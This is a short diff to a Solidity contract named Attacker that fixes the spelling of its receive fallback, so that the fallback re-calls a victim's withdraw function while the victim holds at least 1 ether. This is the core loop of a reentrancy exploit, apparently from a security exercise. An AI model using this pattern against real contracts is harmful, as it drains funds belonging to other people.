@@ -19,7 +19,7 @@ contract Attacker {
 
     }
 
-    function recieve() public payable{
+    receive() external payable{
         if(address(victim).balance>=1 ether){
             victim.withdraw();
         }
